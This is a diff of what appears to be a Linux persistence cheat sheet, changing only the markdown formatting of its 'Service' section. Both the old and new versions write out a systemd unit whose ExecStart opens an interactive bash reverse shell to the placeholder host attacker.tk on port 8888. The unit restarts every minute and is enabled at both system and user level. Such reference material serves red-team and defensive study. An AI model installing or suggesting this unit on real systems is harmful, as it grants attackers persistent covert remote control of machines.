@@ -92,20 +92,20 @@
 
 * Service
 
-`bash#> vim /etc/systemd/system/persistence.service
-bash$> vim ~/.config/systemd/user/persistence.service
-[Unit]
-Description=persistence
-[Service]
-ExecStart=/bin/bash ‐c 'bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1'
-Restart=always
-RestartSec=60
-[Install]
-WantedBy=default.target
-bash#> systemctl enable persistence.service
-bash#> systemctl start persistence.service
-bash$> systemctl ‐‐user enable persistence.service
-bash$> systemctl ‐‐user start persistence.service`
+`bash#> vim /etc/systemd/system/persistence.service`
+`bash$> vim ~/.config/systemd/user/persistence.service`
+`[Unit]`
+`Description=persistence`
+`[Service]`
+`ExecStart=/bin/bash ‐c 'bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1'`
+`Restart=always`
+`RestartSec=60`
+`[Install]`
+`WantedBy=default.target`
+`bash#> systemctl enable persistence.service`
+`bash#> systemctl start persistence.service`
+`bash$> systemctl ‐‐user enable persistence.service`
+`bash$> systemctl ‐‐user start persistence.service`
 
 * Tasks
 
